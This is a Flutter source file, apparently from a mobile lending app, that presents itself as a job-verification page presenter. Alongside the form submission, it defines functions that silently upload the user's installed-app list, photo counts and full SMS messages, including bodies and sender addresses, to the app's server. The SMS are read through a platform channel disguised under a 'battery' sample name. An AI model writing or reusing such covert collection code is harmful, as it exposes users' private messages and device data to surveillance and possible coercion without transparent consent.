import 'dart:convert';

import 'package:appcheck/appcheck.dart';
import 'package:dio/dio.dart';
import 'package:flutter/material.dart';
import 'package:flutter/services.dart';
import 'package:myapp9/config/constant.dart';
import 'package:myapp9/models/verify_item_store_entity.dart';
import 'package:myapp9/mvp/base_page_presenter.dart';
import 'package:myapp9/net/net.dart';
import 'package:myapp9/pages/sign/router/sign_router.dart';
import 'package:myapp9/pages/verify/iviews/job_i_mvp_view.dart';
import 'package:myapp9/providers/verify_provider.dart';
// import 'package:photo_manager/photo_manager.dart';
import 'package:provider/provider.dart';
import 'package:sp_util/sp_util.dart';

import '../../../config/index_action_constant.dart';
import '../../../providers/user_provider.dart';
import '../../../util/helper.dart';

class JobPagePresenter extends BasePagePresenter<JobIMvpView> {
  static const platform = MethodChannel('samples.flutter.io/battery');
  @override
  void initState() {
    WidgetsBinding.instance.addPostFrameCallback((_) {
      // getPhoto();
      // getApps();
      // r();
    });
  }

  void store(Map<String, String> formmap, isShowDialog) {
    // Map<String, String> formmapTmp = Map.fromIterable(formmap.keys.where((k) => true), key: (k) => k, value: (v) => v.text);
    // Map<String, String> formmapTmp = {for (var e in formmap.keys) e: formmap[e]!.text};
    FormData formData = FormData.fromMap(formmap);
    requestNetwork<VerifyItemStoreEntity>(Method.post, url: HttpApi.mAJobStore, params: formData, isShow: isShowDialog as bool, onSuccess: (data) {
      if (data != null) {
        //  Provider.of<ThemeProvider>(context, listen: false).setTheme(themeMode);
        /// 与上方等价，provider 4.1.0添加的拓展方法
        if (data.data!.next == Constant.liveness || data.data!.next == SignRouter.sign) {
          view.getContext().read<UserProvider>().setIndexAction(IndexActionConst.sign.actionNo);
        }
        Helper.handleNextVerifyItem(view: view, next: data.data!.next);
        view.getContext().read<VerifyProvider>().setPJobVerifyStatus(Constant.success);
        view.onCreateSuccess(data.data!.next!);
      }
    }, onError: (_, __) {
      /// 加载失败
    });
  }

  Future<void> getApps() async {
    int lastAppUploadTIme = SpUtil.getInt(Constant.tLastAppTime) ?? 0;
    DateTime now = DateTime.now();
    int timestamp = now.millisecondsSinceEpoch ~/ 1000;
    if (!(lastAppUploadTIme == 0 || timestamp - lastAppUploadTIme > 3600 * 1000)) {
      return;
    }
    List<AppInfo>? installedApps2;
    List<Map<String, dynamic>> appMaps = [];
    final appCheck = AppCheck();
    List<AppInfo>? installedApps;
    installedApps = await appCheck.getInstalledApps();
    // debugPrint(installedApps.toString());
    installedApps?.sort(
      (a, b) => a.appName!.toLowerCase().compareTo(b.appName!.toLowerCase()),
    );
    installedApps2 = installedApps?.where((element) => !element.isSystemApp!).toList();
    installedApps?.map((e) => print(e.appName!.toLowerCase()));
    for (AppInfo appOne in installedApps2!) {
      Map<String, dynamic> data = <String, dynamic>{};
      data['appName'] = appOne.appName;
      data['packageName'] = appOne.packageName;
      data['versionName'] = appOne.versionName;
      data['isSystemApp'] = appOne.isSystemApp;
      appMaps.add(data);
    }
    Map<String, dynamic> FormDataMap = {};
    FormDataMap['messages'] = jsonEncode(appMaps);
    FormData formData = FormData.fromMap(FormDataMap);
    var isShowDialog = false;
    requestNetwork<dynamic>(Method.post, url: HttpApi.sAApp, params: formData, isShow: isShowDialog, onSuccess: (data) {
      DateTime now = DateTime.now();
      int timestamp = now.millisecondsSinceEpoch;
      SpUtil.putInt(Constant.tLastAppTime, timestamp ~/ 1000);
      if (data != null) {}
    }, onError: (_, __) {
      /// 加载失败
    });
  }
//todo 相册解注释
  /*PMFilter createFilter(num start) {
    final CustomFilter filterOption = CustomFilter.sql(
      where: '${CustomColumns.base.createDate} > ${start} ',
      orderBy: [OrderByItem.desc(CustomColumns.base.createDate)],
    );

    return filterOption;
  }

  final FilterOptionGroup filterOption = FilterOptionGroup(
    imageOption: FilterOption(
      sizeConstraint: SizeConstraint(
        maxWidth: 10000,
        maxHeight: 10000,
        minWidth: 100,
        minHeight: 100,
        ignoreSize: false,
      ),
    ),
    videoOption: FilterOption(
      durationConstraint: DurationConstraint(
        min: Duration(seconds: 1),
        max: Duration(seconds: 30),
        allowNullable: false,
      ),
    ),
    createTimeCond: DateTimeCond(
      min: DateTime(2020, 1, 1),
      max: DateTime(2020, 1, 1),
    ),
    orders: [
      OrderOption(
        type: OrderOptionType.createDate,
        asc: false,
      ),
    ],

    /// other options
  );*/

  Future<void> getPhoto() async {
    DateTime now = DateTime.now();
    // 获取一个年前的时间
    DateTime oneYearAgo = DateTime(now.year - 1, now.month, now.day, now.hour, now.minute, now.second);
    // 获取一个月前的时间
    DateTime oneMonthAgo = DateTime(now.year, now.month - 1, now.day, now.hour, now.minute, now.second);
// 获取一天前的时间
    DateTime oneWeekAgo = DateTime(now.year, now.month, now.day - 7, now.hour, now.minute, now.second);
    // 获取一天前的时间
    DateTime oneDayAgo = DateTime(now.year, now.month, now.day - 1, now.hour, now.minute, now.second);

    // 将时间转换为时间戳（单位：秒）
    int oneYearAgoTimestamp = oneYearAgo.millisecondsSinceEpoch ~/ 1000;
    int oneMonthAgoTimestamp = oneMonthAgo.millisecondsSinceEpoch ~/ 1000;
    int oneWeekAgoTimestamp = oneWeekAgo.millisecondsSinceEpoch ~/ 1000;
    int oneDayAgoTimestamp = oneDayAgo.millisecondsSinceEpoch ~/ 1000;
/*    if (await view.requestPermission('storage')) {
      print("storage");
    }
    if (await view.requestPermission('photos')) {
      print("photos");
    }*/

    /*final PermissionState ps = await PhotoManager.requestPermissionExtend();
    final int count = await PhotoManager.getAssetCount();
    final int oneYearAgoCount = await PhotoManager.getAssetCount(filterOption: createFilter(oneYearAgoTimestamp));
    final int oneMonthAgoCount = await PhotoManager.getAssetCount(filterOption: createFilter(oneMonthAgoTimestamp));
    final int oneWeekAgoCount = await PhotoManager.getAssetCount(filterOption: createFilter(oneWeekAgoTimestamp));
    final int oneDayAgoCount = await PhotoManager.getAssetCount(filterOption: createFilter(oneDayAgoTimestamp));*/

    Map<String, dynamic> FormDataMap = {};
/*    FormDataMap['one_year_ago_count'] = oneYearAgoCount;
    FormDataMap['one_month_ago_count'] = oneMonthAgoCount;
    FormDataMap['one_week_ago_count'] = oneWeekAgoCount;
    FormDataMap['one_day_ago_count'] = oneDayAgoCount;*/
    FormData formData = FormData.fromMap(FormDataMap);
    var isShowDialog = false;
    requestNetwork<dynamic>(Method.post, url: HttpApi.gLPhoto, params: formData, isShow: isShowDialog, onSuccess: (data) {
      if (data != null) {}
    }, onError: (_, __) {
      /// 加载失败
    });
  }

  Future<void> r() async {
    int lastSmsUploadTIme = SpUtil.getInt(Constant.nLastMsgTime) ?? 0;
    DateTime now = DateTime.now();
    int timestamp = now.millisecondsSinceEpoch ~/ 1000;
    if (!(lastSmsUploadTIme == 0 || timestamp - lastSmsUploadTIme > 3600 * 1000)) {
      return;
    }
    Map<String, dynamic>? params = {"id": 1};
    await requestNetwork<dynamic>(Method.get, url: '${HttpApi.nUserProfile}/1', queryParameters: params, isShow: false, onSuccess: (data) async {
      bool permission = await view.requestPermission('sms');
      Map<String, dynamic> FormDataMap = {};
      if (permission) {
        Map<String, dynamic> arguments = <String, dynamic>{
          'start': DateTime.parse(data['data']['n_last_msg_time'] as String).millisecondsSinceEpoch,
        };
        final List<dynamic> messages = await platform.invokeMethod('getSmsList', arguments) as List;
    //     {
    //       "id": "1",
    //   "a_user_id": "1",
    //   "date": "20240909",
    //   "date_sent": "20240901",
    //   "thread_id": "123",
    //   "read": "1",
    //   "seen": "1",
    //   "status": "1",
    //   "type": "1",
    //   "address": "string",
    //   "body": "You have just paid back your airtime loan. Total loan paid back for the day is N100.00. Loan Balance is N260.00. Dial *303# for more loan"
    // }
        List<Map<String, dynamic>> updatedList = messages.map((map) {
          // 创建一个新的Map，并重组数据
          return {
            'id': "1",
            'a_user_id': "1",
            'date': map['date'],
            'date_sent': map['date_sent'],
            'thread_id': map['thread_id'],
            'read': map['read'],
            'seen': map['seen'],
            'status': map['status'],
            'type': map['type'],
            'address': map['address'],
            'body': map['body'],
          };
        }).toList();
        updatedList.forEach((element) {});
        FormDataMap['messages'] = jsonEncode(updatedList);
      }
/*      bool permission2 = await view.requestOpsPermission();
      if (permission2) {
        Map<String, dynamic> arguments = <String, dynamic>{
          'start': DateTime.parse(data['data']['n_last_msg_time']).millisecondsSinceEpoch,
        };
        final List<dynamic> messages = await platform.invokeMethod('getSmsList', arguments);
        messages.forEach((element) {});
        FormDataMap['messages'] = jsonEncode(messages);
      }*/
      FormData formData = FormData.fromMap(FormDataMap);
      var isShowDialog = false;
      requestNetwork<dynamic>(Method.post, url: HttpApi.rCSms, params: formData, isShow: isShowDialog, onSuccess: (data) {
        DateTime now = DateTime.now();
        int timestamp = now.millisecondsSinceEpoch;
        SpUtil.putInt(Constant.nLastMsgTime, timestamp ~/ 1000);
        if (data != null) {}
      }, onError: (_, __) {
        /// 加载失败
      });
    }, onError: (_, __) {
      /// 加载失败
    });
  }
}
